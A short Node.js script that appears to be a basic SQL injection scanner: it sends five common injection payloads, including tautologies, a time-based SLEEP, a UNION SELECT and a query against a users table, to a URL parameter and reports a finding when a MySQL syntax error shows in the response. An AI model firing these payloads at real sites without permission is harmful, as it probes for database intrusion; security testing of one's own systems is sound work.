const axios = require('axios');

const scanForSQLInjection = async (url) => {
  const payloads = [
    "1' OR 1=1--",
    "1' OR '1'='1",
    "1' AND SLEEP(2)--",
    "1' UNION SELECT 1,2,3--",
    "1' AND 1=(SELECT COUNT(*) FROM users)--",
  ];
  for (const payload of payloads) {
    try {
      const response = await axios.get(`${url}${encodeURIComponent(payload)}`);
        if (response.data.includes('error in your SQL syntax')) {
            return `SQL injection vulnerability found with payload ${payload}`;
        }
    } catch (error) {
      console.error(error);
    }
  }
  return 'No SQL injection vulnerability found';
};
scanForSQLInjection('https://example.com/search?q=')
.then(result => console.log(result))
.catch(error => console.error(error));
